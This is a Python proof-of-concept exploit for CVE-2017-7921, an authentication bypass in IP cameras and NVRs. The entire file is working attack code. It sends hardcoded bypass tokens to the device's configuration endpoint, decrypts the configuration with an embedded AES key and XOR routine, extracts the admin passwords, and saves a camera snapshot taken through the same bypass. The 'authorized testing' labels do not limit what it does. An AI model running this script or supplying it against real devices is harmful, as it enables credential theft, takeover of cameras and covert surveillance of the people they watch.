#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import base64
import sys
import urllib.request
import urllib.error

try:
    from Crypto.Cipher import AES

    def _ecb_decrypt(key, data):
        return AES.new(key, AES.MODE_ECB).decrypt(data)

except ImportError:
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes)

        def _ecb_decrypt(key, data):
            d = Cipher(algorithms.AES(key), modes.ECB()).decryptor()
            return d.update(data) + d.finalize()

    except ImportError:
        print("No AES provider found. Install one:\n"
              "    pip install pycryptodome\nor\n"
              "    pip install cryptography", file=sys.stderr)
        sys.exit(2)

AES_KEY = bytes.fromhex("279977f62f6cfd2d91cd75b889ce0c9a")
SWKH = b"SWKH"
XOR_CONST = 0x484B5753
USER_AGENT = "hik-poc/1.0 (authorized self-assessment)"

MAGIC_TOKENS = [
    "YWRtaW46MTEK",
    "YWRtaW46MTIzNDU=",
    "YWRtaW46MTExMQ==",
    "YWRtaW46YWRtaW4=",
    "YWRtaW46Og==",
]

MIN_SIZE = 0x8000
RECORD_STRIDE = 0x40


def http_get(url, timeout):
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, b"", dict(e.headers or {})


def fetch_configuration_file(host, port, timeout):
    base = f"http://{host}:{port}"
    for token in MAGIC_TOKENS:
        url = f"{base}/System/configurationFile?auth={token}"
        try:
            status, body, headers = http_get(url, timeout)
        except (urllib.error.URLError, OSError):
            return None
        if status == 200 and len(body) > MIN_SIZE:
            return token, body, headers.get("Server", "")
    return None


def fetch_snapshot(host, port, timeout):
    base = f"http://{host}:{port}"
    for token in MAGIC_TOKENS:
        url = f"{base}/onvif-http/snapshot?auth={token}"
        try:
            status, body, _ = http_get(url, timeout)
        except (urllib.error.URLError, OSError):
            return None
        if status == 200 and body[:2] == b"\xff\xd8":
            return body
    return None


def decode_configuration(body):
    trimmed = body[: len(body) // 16 * 16]
    plain = bytearray(_ecb_decrypt(AES_KEY, trimmed))

    xkey = (int.from_bytes(plain[:4], "little") ^ XOR_CONST) & 0xFFFFFFFF
    for i in range(len(plain) // 4):
        off = i * 4
        v = int.from_bytes(plain[off:off + 4], "little") ^ xkey
        plain[off:off + 4] = v.to_bytes(4, "little")
    plain = bytes(plain)

    if plain[:4] != SWKH:
        return None, None
    return plain, xkey


def parse_admin_records(plain):
    records = []
    m = plain.find(b"admin")
    while m != -1 and m > 0x100:
        if plain[m + 5] == 0:
            pwd_field = plain[m + 0x20:m + 0x30]
            pwd = pwd_field.split(b"\x00")[0]
            records.append((m, pwd.decode("latin-1")))
        nxt = plain.find(b"admin", m + RECORD_STRIDE)
        if nxt == m:
            break
        m = nxt
    return records


def mask(s):
    if not s:
        return "<empty>"
    if len(s) <= 2:
        return "*" * len(s)
    return s[0] + "*" * (len(s) - 2) + s[-1]


def main():
    ap = argparse.ArgumentParser(
        description="Single-host PoC for CVE-2017-7921 (authorized testing only)")
    ap.add_argument("host", help="camera/NVR address (IP or hostname)")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--show", action="store_true",
                    help="reveal passwords in full (for YOUR OWN device)")
    ap.add_argument("--save", metavar="PATH",
                    help="save decrypted configuration to file")
    ap.add_argument("--no-snapshot", action="store_true",
                    help="disable grabbing a camera frame via /onvif-http/snapshot")
    ap.add_argument("--snapshot-out", metavar="PATH", default="snapshot_bypass.jpg",
                    help="where to save the snapshot (default: snapshot_bypass.jpg)")
    args = ap.parse_args()

    print(f"[*] Target: http://{args.host}:{args.port}")
    result = fetch_configuration_file(args.host, args.port, args.timeout)
    if result is None:
        print("[-] Bypass not effective (or device unreachable / patched).")
        return 1

    token, body, server = result
    print(f"[+] Auth bypass accepted (token {token[:12]}...), "
          f"got /System/configurationFile: {len(body)} bytes")
    if server:
        print(f"[+] Server header: {server!r}")

    plain, xkey = decode_configuration(body)
    if plain is None:
        print("[-] Download succeeded, but decrypt pipeline failed "
              "(firmware format changed -> not vulnerable to this PoC run).")
        return 1

    xhex = f"{xkey:08X}"
    print(f"[+] Decrypt OK: AES-128-ECB (key {AES_KEY.hex()[:12]}...) "
          f"+ derived per-file XOR (0x{xhex}) -> magic '{SWKH.decode()}' OK")

    if args.save:
        with open(args.save, "wb") as f:
            f.write(plain)
        print(f"[+] Decrypted configuration saved to {args.save}")

    records = parse_admin_records(plain)
    if not records:
        print("[-] Plaintext config present, but no 'admin' records parsed.")
        return 1

    print(f"[+] Vulnerable: {len(records)} plaintext 'admin' record(s) "
          f"in the downloaded configuration:")
    for i, (off, pwd) in enumerate(records, 1):
        shown = pwd if args.show else mask(pwd)
        flag = "  [full: --show]" if not args.show else ""
        print(f"    rec#{i}  offset 0x{off:06X}  password: {shown!r} ({len(pwd)} chars){flag}")

    if not args.no_snapshot:
        frame = fetch_snapshot(args.host, args.port, args.timeout)
        if frame:
            with open(args.snapshot_out, "wb") as f:
                f.write(frame)
            print(f"[+] Snapshot also works ({len(frame)} bytes JPEG) -> saved to "
                  f"{args.snapshot_out}  (same magic token, video channel)")
        else:
            print("[-] Snapshot channel unavailable (or camera without video)")

    return 0


if __name__ == "__main__":
    sys.exit(main())
